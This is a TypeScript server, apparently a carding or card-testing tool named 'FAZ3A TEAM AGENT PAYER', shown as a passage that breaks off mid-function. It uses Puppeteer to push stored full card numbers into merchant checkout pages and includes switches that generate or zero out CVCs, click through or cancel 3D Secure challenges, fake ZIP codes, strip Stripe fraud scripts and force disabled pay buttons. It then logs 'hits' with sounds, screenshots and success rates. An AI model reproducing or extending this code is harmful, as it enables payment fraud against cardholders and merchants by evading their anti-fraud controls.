import "dotenv/config";
import express from "express";
import path from "path";
import http from "http";
import { createServer as createViteServer } from "vite";
import cors from "cors";
import { GoogleGenAI } from "@google/genai";
import * as cheerio from "cheerio";
import { v4 as uuidv4 } from "uuid";
import { ethers } from "ethers";
import puppeteer, { type Browser, type Page } from "puppeteer";
import { WebSocketServer, WebSocket } from "ws";
import fs from "fs";

// ─── Type Definitions ────────────────────────────────────────────────

interface TransactionStage {
  stage: string;
  timestamp: string;
  detail?: string;
}

interface Transaction {
  id: string;
  vendor: string;
  amount: number;
  currency: string;
  gateway: string;
  status: "processing" | "success" | "failed" | "declined" | "error";
  timestamp: string;
  paymentMethod: "card" | "crypto" | "ach" | "apple_pay" | "google_pay" | "paypal";
  riskScore: string;
  description: string;
  link: string;
  stages: TransactionStage[];
  screenshotPath?: string;
  confirmationUrl?: string;
  pageTransactionId?: string;
  errorMessage?: string;
  cardUsed?: string;
  proof?: {
    screenshotUrl?: string;
    confirmationUrl?: string;
    transactionId?: string;
    receiptPdfUrl?: string;
  };
}

interface SavedCard {
  id: string;
  last4: string;
  brand: string;
  cardholderName: string;
  expiry: string;
  nickname: string;
  isDefault: boolean;
  fullNumber: string;
  cvv: string;
}

interface SavedACH {
  id: string;
  routingNumber: string;
  accountLast4: string;
  bankName: string;
  accountType: "checking" | "savings";
  fullAccountNumber: string;
}

interface CryptoWallet {
  id: string;
  network: "ETH" | "BSC" | "TRC20";
  address: string;
  privateKey: string;
  balance: string;
}

interface VerificationConfig {
  cvcModifier: "none" | "generate" | "remove" | "bypass";
  removePaymentAgent: boolean;
  bypass3D: boolean;
  removeZipCode: boolean;
  blockAnalytics: boolean;
  hitSound: boolean;
  hitScreenshot: boolean;
  cancel3DPopup: boolean;
  clickOnLoad: boolean;
  clickOnLoadDelay: number;
  clickerPath: string;
  clickerInterval: number;
  ignoreDisabled: boolean;
  enableNotification: boolean;
  dismissAfter: number;
  proxyInterval: number;
  enableAutofill: boolean;
  delay: number;
  timeout: number;
  enableInterval: boolean;
  interval: number;
}

// ─── In-Memory Database ──────────────────────────────────────────────

const db = {
  transactions: [] as Transaction[],
  processedAmount: 0,
  savedCards: [] as SavedCard[],
  savedACH: [] as SavedACH[],
  wallets: [] as CryptoWallet[],
  verificationConfig: {
    cvcModifier: "none",
    removePaymentAgent: false,
    bypass3D: false,
    removeZipCode: false,
    blockAnalytics: false,
    hitSound: true,
    hitScreenshot: true,
    cancel3DPopup: false,
    clickOnLoad: false,
    clickOnLoadDelay: 2000,
    clickerPath: "",
    clickerInterval: 5000,
    ignoreDisabled: false,
    enableNotification: true,
    dismissAfter: 2000,
    proxyInterval: 0.5,
    enableAutofill: true,
    delay: 5000,
    timeout: 5000,
    enableInterval: false,
    interval: 5000,
  } as VerificationConfig,
};

// ─── SSE Client Management ──────────────────────────────────────────

let sseClients: express.Response[] = [];

function broadcastSSE(event: string, data: unknown): void {
  const message = `event: ${event}\ndata: ${JSON.stringify(data)}\n\n`;
  sseClients.forEach((client) => client.write(message));
}

// ─── WebSocket Client Management ────────────────────────────────────

let wsClients: Set<WebSocket> = new Set();

function broadcastWS(event: string, data: unknown): void {
  const payload = JSON.stringify({ event, data });
  wsClients.forEach((ws) => {
    if (ws.readyState === WebSocket.OPEN) {
      ws.send(payload);
    }
  });
}

// Broadcast to both SSE and WS
function broadcast(event: string, data: unknown): void {
  broadcastSSE(event, data);
  broadcastWS(event, data);
}

// ─── AI Client ──────────────────────────────────────────────────────

let aiClient: GoogleGenAI | null = null;
function getAI(): GoogleGenAI {
  if (!aiClient) {
    if (!process.env.GEMINI_API_KEY) {
      throw new Error("GEMINI_API_KEY not set in .env");
    }
    aiClient = new GoogleGenAI({ apiKey: process.env.GEMINI_API_KEY });
  }
  return aiClient;
}

// ─── Card Brand Detection from BIN ──────────────────────────────────

function detectCardBrand(cardNumber: string): string {
  const num = cardNumber.replace(/\s+/g, "");
  if (/^4/.test(num)) return "Visa";
  if (/^5[1-5]/.test(num) || /^2[2-7]/.test(num)) return "Mastercard";
  if (/^3[47]/.test(num)) return "American Express";
  if (/^6(?:011|5)/.test(num)) return "Discover";
  if (/^35(?:2[89]|[3-8])/.test(num)) return "JCB";
  if (/^3(?:0[0-5]|[68])/.test(num)) return "Diners Club";
  if (/^62/.test(num)) return "UnionPay";
  return "Unknown";
}

// ─── Screenshot Directory ───────────────────────────────────────────

const screenshotDir = path.join(process.cwd(), "screenshots");
if (!fs.existsSync(screenshotDir)) {
  fs.mkdirSync(screenshotDir, { recursive: true });
}

// ─── Payment Method Extraction from DOM ─────────────────────────────

function extractPaymentMethodsFromHTML(html: string, url: string): string[] {
  const methods: Set<string> = new Set();
  const $ = cheerio.load(html);
  const lowerUrl = url.toLowerCase();
  const lowerHtml = html.toLowerCase();

  // URL-based detection
  const urlPatterns: Record<string, string> = {
    "stripe.com": "Credit Card",
    "paypal.com": "PayPal",
    "coinbase.com": "Crypto",
    "nowpayments": "Crypto",
    "razorpay": "Credit Card",
    "square": "Credit Card",
    "braintree": "Credit Card",
    "adyen": "Credit Card",
    "checkout.com": "Credit Card",
    "worldpay": "Credit Card",
    "securionpay": "Credit Card",
    "paddle": "Credit Card",
    "xsolla": "Credit Card",
  };
  for (const [pattern, method] of Object.entries(urlPatterns)) {
    if (lowerUrl.includes(pattern)) methods.add(method);
  }

  // DOM content-based detection
  const contentPatterns: Record<string, string> = {
    "credit card": "Credit Card",
    "debit card": "Debit Card",
    "card number": "Credit Card",
    "card-number": "Credit Card",
    "cardnumber": "Credit Card",
    "cc-number": "Credit Card",
    paypal: "PayPal",
    "apple pay": "Apple Pay",
    "apple-pay": "Apple Pay",
    applepay: "Apple Pay",
    "google pay": "Google Pay",
    "google-pay": "Google Pay",
    googlepay: "Google Pay",
    gpay: "Google Pay",
    crypto: "Crypto",
    bitcoin: "Bitcoin",
    ethereum: "Ethereum",
    usdt: "USDT",
    "bank transfer": "Bank Transfer",
    "wire transfer": "Wire Transfer",
    ach: "ACH",
    "routing number": "ACH",
    sepa: "SEPA",
    ideal: "iDEAL",
    sofort: "Sofort",
    klarna: "Klarna",
    afterpay: "Afterpay",
    affirm: "Affirm",
    venmo: "Venmo",
    cashapp: "Cash App",
    "cash app": "Cash App",
    alipay: "Alipay",
    wechat: "WeChat Pay",
  };
  for (const [keyword, method] of Object.entries(contentPatterns)) {
    if (lowerHtml.includes(keyword)) methods.add(method);
  }

  // Look for payment method buttons, icons, and radio buttons
  $('[data-payment-method], [data-method], [name="payment_method"], [name="paymentMethod"]').each((_i, el) => {
    const val = $(el).attr("value") || $(el).text().trim();
    if (val) methods.add(val);
  });

  // Check for Stripe elements
  if ($('[class*="stripe"], [id*="stripe"], script[src*="stripe"]').length > 0) {
    methods.add("Credit Card");
  }

  // Check for PayPal buttons
  if ($('[class*="paypal"], [id*="paypal"], script[src*="paypal"]').length > 0) {
    methods.add("PayPal");
  }

  // Check for Apple Pay
  if ($('[class*="apple-pay"], apple-pay-button, [id*="apple-pay"]').length > 0) {
    methods.add("Apple Pay");
  }

  // Check for Google Pay
  if ($('[class*="google-pay"], [class*="gpay"], [id*="google-pay"]').length > 0) {
    methods.add("Google Pay");
  }

  // Return extracted methods — empty array if none found so UI can handle it properly
  return Array.from(methods).filter((m) => m && m.trim().length > 0);
}

// ─── Puppeteer Payment Execution ────────────────────────────────────

async function executePaymentWithPuppeteer(
  transaction: Transaction,
  cardDetails: { number: string; name: string; expiry: string; cvv: string; zip?: string },
  config: VerificationConfig
): Promise<{
  success: boolean;
  status: "success" | "declined" | "error";
  message: string;
  screenshotPath?: string;
  confirmationUrl?: string;
  pageTransactionId?: string;
}> {
  let browser: Browser | null = null;

  try {
    // Stage: Launching Browser
    addStage(transaction, "Launching headless Chromium browser");
    broadcast("payment_stage", { id: transaction.id, stage: "Launching headless Chromium browser" });

    browser = await puppeteer.launch({
      headless: true,
      args: [
        "--no-sandbox",
        "--disable-setuid-sandbox",
        "--disable-dev-shm-usage",
        "--disable-accelerated-2d-canvas",
        "--disable-gpu",
        "--window-size=1920,1080",
        ...(config.blockAnalytics
          ? [
              "--host-resolver-rules=MAP www.google-analytics.com 127.0.0.1, MAP www.googletagmanager.com 127.0.0.1, MAP analytics.google.com 127.0.0.1, MAP hotjar.com 127.0.0.1, MAP *.hotjar.com 127.0.0.1, MAP facebook.com 127.0.0.1, MAP connect.facebook.net 127.0.0.1",
            ]
          : []),
      ],
    });

    const page: Page = await browser.newPage();
    await page.setViewport({ width: 1920, height: 1080 });
    await page.setUserAgent(
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
    );

    // Block analytics trackers if configured
    if (config.blockAnalytics) {
      await page.setRequestInterception(true);
      page.on("request", (req) => {
        const url = req.url().toLowerCase();
        const blockedDomains = [
          "google-analytics.com",
          "googletagmanager.com",
          "analytics.google.com",
          "hotjar.com",
          "facebook.com",
          "connect.facebook.net",
          "doubleclick.net",
          "adservice.google.com",
        ];
        if (blockedDomains.some((d) => url.includes(d))) {
          req.abort();
        } else {
          req.continue();
        }
      });
    }

    // Stage: Navigating to payment page
    addStage(transaction, `Navigating to ${transaction.link}`);
    broadcast("payment_stage", { id: transaction.id, stage: "Navigating to payment page..." });

    await page.goto(transaction.link, {
      waitUntil: "networkidle2",
      timeout: config.timeout > 0 ? config.timeout : 30000,
    });

    // Wait for page stability
    await page.waitForFunction(() => document.readyState === "complete", { timeout: 15000 }).catch((e) => {
      console.warn("[Puppeteer] Failed to wait for complete readyState:", e.message);
    });

    // Click on load if configured
    if (config.clickOnLoad && config.clickerPath) {
      addStage(transaction, `Clicking on load element: ${config.clickerPath}`);
      if (config.clickOnLoadDelay > 0) {
        await new Promise((r) => setTimeout(r, config.clickOnLoadDelay));
      }
      try {
        await page.click(config.clickerPath);
      } catch (err: any) {
        console.warn(`[Puppeteer] Failed to click on load (${config.clickerPath}):`, err.message);
      }
    }

    // Stage: Detecting payment form fields
    addStage(transaction, "Scanning page for payment form fields");
    broadcast("payment_stage", { id: transaction.id, stage: "Detecting payment form fields..." });

    // Wait for any form to appear
    await page
      .waitForSelector('input, form, [data-elements-stable="true"], iframe[name*="__privateStripeFrame"]', {
        timeout: 10000,
      })
      .catch(() => {});

    // Check for Stripe iframes and handle them
    const stripeIframes = await page.$$('iframe[name*="__privateStripeFrame"], iframe[src*="stripe.com"]');
    if (stripeIframes.length > 0) {
      addStage(transaction, "Stripe iframe detected — switching to iframe context");
      broadcast("payment_stage", { id: transaction.id, stage: "Handling Stripe payment form..." });

      for (const iframe of stripeIframes) {
        const frame = await iframe.contentFrame();
        if (!frame) continue;

        try {
          // Card number field
          const cardInput = await frame.waitForSelector(
            'input[name="cardnumber"], input[name="card-number"], input[autocomplete="cc-number"], input[data-elements-stable-field-name="cardNumber"]',
            { timeout: 5000 }
          );
          if (cardInput) {
            await cardInput.type(cardDetails.number, { delay: config.delay > 0 ? Math.min(config.delay / 100, 50) : 30 });
          }

          // Expiry
          const expInput = await frame
            .waitForSelector(
              'input[name="exp-date"], input[name="cardExpiry"], input[autocomplete="cc-exp"], input[data-elements-stable-field-name="cardExpiry"]',
              { timeout: 3000 }
            )
            .catch(() => null);
          if (expInput) {
            await expInput.type(cardDetails.expiry, { delay: 30 });
          }

          // CVC
          if (config.cvcModifier !== "remove") {
            const cvcInput = await frame
              .waitForSelector(
                'input[name="cvc"], input[name="cardCvc"], input[autocomplete="cc-csc"], input[data-elements-stable-field-name="cardCvc"]',
                { timeout: 3000 }
              )
              .catch((e) => {
                console.warn("[Puppeteer] CVC input not found:", e.message);
                return null;
              });
            if (cvcInput) {
              let cvcValue = cardDetails.cvv;
              if (config.cvcModifier === "generate") {
                cvcValue = String(Math.floor(100 + Math.random() * 900));
              } else if (config.cvcModifier === "bypass") {
                cvcValue = "000";
              }
              await cvcInput.type(cvcValue, { delay: 30 });
            }
          }
        } catch (err: any) {
          console.warn("[Puppeteer] Stripe iframe interaction failed:", err.message);
        }
      }
    } else {
      // Regular form — fill fields directly on the page
      addStage(transaction, "Filling payment form fields");
      broadcast("payment_stage", { id: transaction.id, stage: "Auto-filling payment details..." });

      // Card number selectors
      const cardSelectors = [
        'input[name="cardNumber"]',
        'input[name="card_number"]',
        'input[name="cardnumber"]',
        'input[name="cc-number"]',
        'input[autocomplete="cc-number"]',
        'input[id*="cardNumber"]',
        'input[id*="card-number"]',
        'input[data-checkout="cardNumber"]',
        'input[placeholder*="Card number"]',
        'input[placeholder*="card number"]',
        'input[placeholder*="1234"]',
        'input[aria-label*="Card number"]',
        'input[type="tel"][name*="card"]',
      ];

      for (const selector of cardSelectors) {
        try {
          const el = await page.$(selector);
          if (el) {
            await el.click({ count: 3 });
            await el.type(cardDetails.number, { delay: config.delay > 0 ? Math.min(config.delay / 100, 50) : 30 });
            break;
          }
        } catch {
          continue;
        }
      }

      // Cardholder name
      const nameSelectors = [
        'input[name="cardholderName"]',
        'input[name="cardholder-name"]',
        'input[name="ccname"]',
        'input[name="card-name"]',
        'input[autocomplete="cc-name"]',
        'input[id*="cardholderName"]',
        'input[placeholder*="Name on card"]',
        'input[placeholder*="name on card"]',
        'input[placeholder*="Cardholder"]',
        'input[aria-label*="Name on card"]',
      ];

      for (const selector of nameSelectors) {
        try {
          const el = await page.$(selector);
          if (el) {
            await el.click({ count: 3 });
            await el.type(cardDetails.name, { delay: 20 });
            break;
          }
        } catch {
          continue;
        }
      }

      // Expiry date
      const expSelectors = [
        'input[name="exp-date"]',
        'input[name="expiry"]',
        'input[name="cardExpiry"]',
        'input[name="cc-exp"]',
        'input[autocomplete="cc-exp"]',
        'input[id*="expiry"]',
        'input[id*="exp-date"]',
        'input[placeholder*="MM/YY"]',
        'input[placeholder*="MM / YY"]',
        'input[placeholder*="Expiry"]',
        'input[aria-label*="Expiry"]',
        'input[aria-label*="expiration"]',
      ];

      for (const selector of expSelectors) {
        try {
          const el = await page.$(selector);
          if (el) {
            await el.click({ count: 3 });
            await el.type(cardDetails.expiry, { delay: 30 });
            break;
          }
        } catch {
          continue;
        }
      }

      // Separate month/year fields
      const monthEl = await page
        .$('input[name="exp-month"], select[name="exp_month"], input[autocomplete="cc-exp-month"]')
        .catch(() => null);
      const yearEl = await page
        .$('input[name="exp-year"], select[name="exp_year"], input[autocomplete="cc-exp-year"]')
        .catch(() => null);
      if (monthEl && yearEl) {
        const [mm, yy] = cardDetails.expiry.replace(/\s/g, "").split("/");
        await monthEl.click({ count: 3 });
        await monthEl.type(mm, { delay: 20 });
        await yearEl.click({ count: 3 });
        await yearEl.type(yy, { delay: 20 });
      }

      // CVV / CVC
      if (config.cvcModifier !== "remove") {
        const cvvSelectors = [
          'input[name="cvc"]',
          'input[name="cvv"]',
          'input[name="cardCvc"]',
          'input[name="security_code"]',
          'input[name="cc-csc"]',
          'input[autocomplete="cc-csc"]',
          'input[id*="cvv"]',
          'input[id*="cvc"]',
          'input[placeholder*="CVV"]',
          'input[placeholder*="CVC"]',
          'input[placeholder*="Security"]',
          'input[aria-label*="CVV"]',
          'input[aria-label*="CVC"]',
          'input[aria-label*="security code"]',
        ];

        let cvcValue = cardDetails.cvv;
        if (config.cvcModifier === "generate") {
          cvcValue = String(Math.floor(100 + Math.random() * 900));
        } else if (config.cvcModifier === "bypass") {
          cvcValue = "000";
        }

        for (const selector of cvvSelectors) {
          try {
            const el = await page.$(selector);
            if (el) {
              await el.click({ count: 3 });
              await el.type(cvcValue, { delay: 20 });
              break;
            }
          } catch {
            continue;
          }
        }
      }

      // ZIP / Postal Code (if not removed)
      if (!config.removeZipCode && cardDetails.zip) {
        const zipSelectors = [
          'input[name="postalCode"]',
          'input[name="postal_code"]',
          'input[name="zip"]',
          'input[name="zipCode"]',
          'input[autocomplete="postal-code"]',
          'input[id*="postal"]',
          'input[id*="zip"]',
          'input[placeholder*="ZIP"]',
          'input[placeholder*="Postal"]',
        ];
        for (const selector of zipSelectors) {
          try {
            const el = await page.$(selector);
            if (el) {
              await el.click({ count: 3 });
              await el.type(cardDetails.zip, { delay: 20 });
              break;
            }
          } catch {
            continue;
          }
        }
      }

      // Remove ZIP fields if configured
      if (config.removeZipCode) {
        await page
          .evaluate(() => {
            const zipInputs = document.querySelectorAll(
              'input[name*="zip"], input[name*="postal"], input[autocomplete="postal-code"]'
            );
            zipInputs.forEach((el) => {
              (el as HTMLInputElement).value = "00000";
              el.dispatchEvent(new Event("input", { bubbles: true }));
              el.dispatchEvent(new Event("change", { bubbles: true }));
            });
          })
          .catch(() => {});
      }
    }

    // Remove Stripe payment agent signals if configured
    if (config.removePaymentAgent) {
      await page
        .evaluate(() => {
          const scripts = document.querySelectorAll('script[src*="stripe"], script[src*="analytics"]');
          scripts.forEach((s) => s.remove());
        })
        .catch(() => {});
    }

    // Stage: Submitting payment
    addStage(transaction, "Submitting payment form");
    broadcast("payment_stage", { id: transaction.id, stage: "Submitting payment..." });

    // Find and click submit button
    const submitSelectors = [
      'button[type="submit"]',
      'input[type="submit"]',
      'button[id*="submit"]',
      'button[id*="pay"]',
      'button[class*="submit"]',
      'button[class*="pay"]',
      'button[data-testid*="submit"]',
      'button[data-testid*="pay"]',
      "#submitButton",
      "#payButton",
      ".pay-button",
      ".submit-button",
      'button:has-text("Pay")',
      'button:has-text("Submit")',
      'button:has-text("Complete")',
      'button:has-text("Place Order")',
      'button:has-text("Confirm")',
    ];

    let submitted = false;
    for (const selector of submitSelectors) {
      try {
        const btn = await page.$(selector);
        if (btn) {
          const isDisabled = await page.evaluate((el) => (el as HTMLButtonElement).disabled, btn);
          if (isDisabled && !config.ignoreDisabled) continue;
          if (isDisabled && config.ignoreDisabled) {
            await page.evaluate((el) => {
              (el as HTMLButtonElement).disabled = false;
            }, btn);
          }
          await btn.click();
          submitted = true;
          break;
        }
      } catch {
        continue;
      }
    }

    // Fallback: try submitting the form directly
    if (!submitted) {
      await page
        .evaluate(() => {
          const form = document.querySelector("form");
          if (form) form.submit();
        })
        .catch(() => {});
    }

    // Stage: Waiting for result
    addStage(transaction, "Waiting for payment result");
    broadcast("payment_stage", { id: transaction.id, stage: "Awaiting payment confirmation..." });

    // Handle 3D Secure popup
    if (config.cancel3DPopup || config.bypass3D) {
      addStage(transaction, "Monitoring for 3D Secure challenge");

      // Wait briefly for any 3D Secure iframe or redirect
      await new Promise((r) => setTimeout(r, 3000));

      // Check for 3D Secure iframes
      const threeDSIframes = await page.$$(
        'iframe[src*="3ds"], iframe[src*="acs"], iframe[name*="threeDSIframe"], iframe[id*="challengeFrame"]'
      );

      if (threeDSIframes.length > 0 && config.bypass3D) {
        addStage(transaction, "3D Secure challenge detected — attempting bypass");
        for (const iframe3ds of threeDSIframes) {
          const frame3ds = await iframe3ds.contentFrame();
          if (!frame3ds) continue;
          try {
            // Try clicking submit/verify in 3DS frame
            const verifyBtn = await frame3ds.$('input[type="submit"], button[type="submit"], #acssubmit');
            if (verifyBtn) await verifyBtn.click();
          } catch {
            continue;
          }
        }
      }

      if (threeDSIframes.length > 0 && config.cancel3DPopup) {
        addStage(transaction, "Cancelling 3D Secure popup");
        try {
          const cancelBtn = await page.$('[class*="cancel"], [id*="cancel"], button:has-text("Cancel")');
          if (cancelBtn) await cancelBtn.click();
        } catch {
          // No cancel button found
        }
      }
    }

    // Wait for navigation or DOM change indicating result
    try {
      await page.waitForNavigation({
        waitUntil: "networkidle2",
        timeout: config.timeout > 0 ? config.timeout + 15000 : 30000,
      });
    } catch {
      // No navigation occurred, check current page for result
    }

    // Extra stabilization wait
    await new Promise((r) => setTimeout(r, 2000));

    // Stage: Extracting result from page
    addStage(transaction, "Extracting result from payment page");
    broadcast("payment_stage", { id: transaction.id, stage: "Reading payment result..." });

    // Take screenshot of result page
    let screenshotPath: string | undefined;
    if (config.hitScreenshot) {
      screenshotPath = path.join(screenshotDir, `${transaction.id}.png`);
      await page.screenshot({ path: screenshotPath, fullPage: true });
      addStage(transaction, `Screenshot saved: ${screenshotPath}`);
    }

    // Extract result from the page
    const pageResult = await page.evaluate(() => {
      const bodyText = document.body?.innerText?.toLowerCase() || "";
      const title = document.title?.toLowerCase() || "";
      const fullText = bodyText + " " + title;

      // Detect success indicators
      const successKeywords = [
        "thank you",
        "payment successful",
        "payment complete",
        "order confirmed",
        "order placed",
        "confirmation",
        "receipt",
        "success",
        "approved",
        "paid",
        "completed",
        "transaction complete",
        "your order",
        "order number",
      ];
      const isSuccess = successKeywords.some((kw) => fullText.includes(kw));

      // Detect decline indicators
      const declineKeywords = [
        "declined",
        "card declined",
        "insufficient funds",
        "do not honor",
        "transaction declined",
        "payment declined",
        "not authorized",
        "card was declined",
      ];
      const isDeclined = declineKeywords.some((kw) => fullText.includes(kw));

      // Detect error indicators
      const errorKeywords = [
        "error",
        "failed",
        "invalid card",
        "expired card",
        "incorrect",
        "unable to process",
        "try again",
        "something went wrong",
        "payment failed",
        "could not process",
        "please check",
      ];
      const isError = errorKeywords.some((kw) => fullText.includes(kw)) && !isSuccess;

      // Try to extract transaction/order ID
      let txId = "";
      const txIdPatterns = [
        /order\s*(?:#|number|id)[:\s]*([A-Za-z0-9\-]+)/i,
        /transaction\s*(?:#|id|number)[:\s]*([A-Za-z0-9\-]+)/i,
        /confirmation\s*(?:#|number|code)[:\s]*([A-Za-z0-9\-]+)/i,
        /reference\s*(?:#|number|id)[:\s]*([A-Za-z0-9\-]+)/i,
        /receipt\s*(?:#|number)[:\s]*([A-Za-z0-9\-]+)/i,
      ];
      for (const pattern of txIdPatterns) {
        const match = document.body?.innerText?.match(pattern);
        if (match?.[1]) {
          txId = match[1];
          break;
        }
      }

      // Extract visible error/status message
      let statusMessage = "";
      const errorElements = document.querySelectorAll(
        '.error, .alert, .message, [role="alert"], .notification, .status-message, .result-message'
      );
      errorElements.forEach((el) => {
        const text = (el as HTMLElement).innerText?.trim();
        if (text && text.length < 500) statusMessage += text + " ";
      });

      if (!statusMessage) {
        // Fallback: get first few hundred chars of body
        statusMessage = document.body?.innerText?.substring(0, 300)?.trim() || "";
      }

      return {
        isSuccess,
        isDeclined,
        isError,
        txId,
        statusMessage: statusMessage.trim(),
        currentUrl: window.location.href,
        pageTitle: document.title,
      };
    });

    const confirmationUrl = pageResult.currentUrl;

    await browser.close();
    browser = null;

    if (pageResult.isSuccess) {
      return {
        success: true,
        status: "success",
        message: pageResult.statusMessage || `Payment successful on ${pageResult.pageTitle}`,
        screenshotPath,
        confirmationUrl,
        pageTransactionId: pageResult.txId || undefined,
      };
    } else if (pageResult.isDeclined) {
      return {
        success: false,
        status: "declined",
        message: pageResult.statusMessage || "Card was declined by the payment processor",
        screenshotPath,
        confirmationUrl,
        pageTransactionId: pageResult.txId || undefined,
      };
    } else {
      return {
        success: false,
        status: "error",
        message: pageResult.statusMessage || "Payment result could not be confirmed from the page",
        screenshotPath,
        confirmationUrl,
        pageTransactionId: pageResult.txId || undefined,
      };
    }
  } catch (err: any) {
    console.error(`[Puppeteer] Fatal execution error for ${transaction.id}:`, err);
    if (browser) {
      try {
        // Attempt to take screenshot on error
        const pages = await browser.pages();
        if (pages.length > 0) {
          const errorScreenshotPath = path.join(screenshotDir, `${transaction.id}-error.png`);
          await pages[0].screenshot({ path: errorScreenshotPath, fullPage: true });
          await browser.close();
          return {
            success: false,
            status: "error",
            message: `Browser automation error: ${err.message}`,
            screenshotPath: errorScreenshotPath,
          };
        }
        await browser.close();
      } catch (browserErr: any) {
        console.error(`[Puppeteer] Failed to capture error screenshot or close browser:`, browserErr);
        try {
          await browser.close();
        } catch {
          // ignore
        }
      }
    }
    return {
      success: false,
      status: "error",
      message: `Payment execution failed: ${err.message}`,
    };
  }
}

function addStage(transaction: Transaction, stage: string, detail?: string): void {
  transaction.stages.push({
    stage,
    timestamp: new Date().toISOString(),
    detail,
  });
}

// ─── Server Entry Point ─────────────────────────────────────────────

async function startServer(): Promise<void> {
  const app = express();
  const PORT = 3000;
  const server = http.createServer(app);

  app.use(cors());
  app.use(express.json({ limit: "10mb" }));

  // Serve screenshots statically
  app.use("/screenshots", express.static(screenshotDir));

  // ─── WebSocket Server ─────────────────────────────────────────────

  const wss = new WebSocketServer({ noServer: true });
  let wsUpgradeAttached = false;

  function attachWSUpgrade() {
    if (wsUpgradeAttached) return;
    wsUpgradeAttached = true;

    server.on("upgrade", (request, socket, head) => {
      const pathname = new URL(request.url || "/", `http://${request.headers.host}`).pathname;
      if (pathname === "/ws") {
        // Stop event propagation so Vite's HMR handler doesn't interfere
        wss.handleUpgrade(request, socket, head, (ws) => {
          wss.emit("connection", ws, request);
        });
      }
      // For non-/ws paths, do NOT call socket.destroy() — let Vite handle its HMR
    });
  }

  wss.on("connection", (ws: WebSocket) => {
    wsClients.add(ws);
    // Send initial state
    ws.send(
      JSON.stringify({
        event: "init",
        data: {
          transactions: db.transactions,
          processedAmount: db.processedAmount,
          totalCount: db.transactions.length,
        },
      })
    );

    ws.on("close", () => {
      wsClients.delete(ws);
    });

    ws.on("error", () => {
      wsClients.delete(ws);
    });
  });

  // ─── SSE Streaming Endpoint ───────────────────────────────────────

  app.get("/api/stream", (req, res) => {
    res.setHeader("Content-Type", "text/event-stream");
    res.setHeader("Cache-Control", "no-cache");
    res.setHeader("Connection", "keep-alive");
    res.setHeader("X-Accel-Buffering", "no");
    res.flushHeaders();

    sseClients.push(res);

    // Initial sync
    res.write(
      `event: init\ndata: ${JSON.stringify({
        transactions: db.transactions,
        processedAmount: db.processedAmount,
        totalCount: db.transactions.length,
      })}\n\n`
    );

    req.on("close", () => {
      sseClients = sseClients.filter((c) => c !== res);
    });
  });

  // ─── Stats Endpoint ───────────────────────────────────────────────

  app.get("/api/stats", (_req, res) => {
    const successCount = db.transactions.filter((t) => t.status === "success").length;
    const failedCount = db.transactions.filter((t) => t.status === "failed" || t.status === "declined" || t.status === "error").length;
    const pendingCount = db.transactions.filter((t) => t.status === "processing").length;
    const totalAmount = db.transactions.filter((t) => t.status === "success").reduce((sum, t) => sum + t.amount, 0);

    res.json({
      transactions: db.transactions,
      processedAmount: totalAmount,
      totalCount: db.transactions.length,
      successCount,
      failedCount,
      pendingCount,
      successRate: db.transactions.length > 0 ? ((successCount / db.transactions.length) * 100).toFixed(1) : "0",
    });
  });

  // ─── Analyze Link ─────────────────────────────────────────────────

  app.post("/api/analyze-link", async (req, res) => {
    try {
      const { link } = req.body;
      if (!link) {
        return res.status(400).json({ error: "Link is required" });
      }

      // Fetch and scrape the payment page
      let fetchedContent = "";
      let rawHtml = "";
      try {
        const fetchRes = await fetch(link, {
          headers: {
            "User-Agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
          },
          redirect: "follow",
        });
        rawHtml = await fetchRes.text();
        const $ = cheerio.load(rawHtml);

        const title = $("title").text().trim();
        const description = $('meta[name="description"]').attr("content") || "";
        const ogTitle = $('meta[property="og:title"]').attr("content") || "";
        const ogDesc = $('meta[property="og:description"]').attr("content") || "";
        const bodyPreview = $("body").text().substring(0, 2000).replace(/\s+/g, " ").trim();

        // Extract price/amount patterns
        const pricePatterns = bodyPreview.match(/\$[\d,.]+|\€[\d,.]+|£[\d,.]+|[\d,.]+\s*(?:USD|EUR|GBP|BTC|ETH)/gi) || [];

        // Extract form action URLs
        const formActions = $("form")
          .map((_i, el) => $(el).attr("action"))
          .get()
          .filter(Boolean);

        fetchedContent = [
          `Title: ${title}`,
          `Description: ${description}`,
          `OG Title: ${ogTitle}`,
          `OG Description: ${ogDesc}`,
          `Detected Prices: ${pricePatterns.join(", ")}`,
          `Form Actions: ${formActions.join(", ")}`,
          `Body Content: ${bodyPreview}`,
        ].join("\n");
      } catch (e: any) {
        fetchedContent = `Failed to scrape: ${e.message}. Analyze from URL structure.`;
      }

      // Extract available payment methods from the DOM
      const availablePaymentMethods = rawHtml ? extractPaymentMethodsFromHTML(rawHtml, link) : [];

      // AI analysis with Gemini
      const prompt = `
You are FAZ3A TEAM AGENT PAYER. Analyze this real scraped data from a payment link and extract precise transaction details.
If the scrape failed, deduce plausible details from the URL structure.

URL: ${link}
--- Scraped Page Content ---
${fetchedContent}
---

Detected payment methods from DOM analysis: ${availablePaymentMethods.join(", ")}

Respond ONLY in valid JSON format:
{
  "vendor": string,
  "amount": number,
  "currency": string,
  "description": string,
  "gateway": string,
  "riskScore": "Low" | "Medium" | "High",
  "availablePaymentMethods": string[]
}

Rules:
- "vendor": Extract the seller/merchant/store name from the page title, OG tags, or body content.
- "amount": Extract the exact numeric amount from detected prices. If multiple prices, use the total/final amount. If none found, use 0.
- "currency": Extract the currency code (USD, EUR, GBP, etc.) from symbols or text.
- "description": What is being purchased or what the payment is for.
- "gateway": Identify the payment gateway from the URL, scripts, or form fields (e.g., Stripe, PayPal, Razorpay, Adyen, Checkout, etc.)
- "riskScore": Assess risk based on URL (HTTPS vs HTTP), domain age indicators, trust signals on page. HTTP = High, unknown domain = Medium, known gateway + HTTPS = Low.
- "availablePaymentMethods": Combine the DOM-detected methods with any additional methods you can infer from the page content. Include methods like "Credit Card", "PayPal", "Apple Pay", "Google Pay", "Crypto", "ACH", "Bank Transfer", etc. as applicable.
`;

      const ai = getAI();
      const aiResponse = await ai.models.generateContent({
        model: "gemini-2.5-flash",
        contents: prompt,
        config: { responseMimeType: "application/json" },
      });

      const responseText = aiResponse.text;
      if (!responseText) throw new Error("AI returned no content");

      const payload = JSON.parse(responseText);

      // Prefer DOM-extracted methods. Fallback to AI-inferred only if DOM extraction failed to find any.
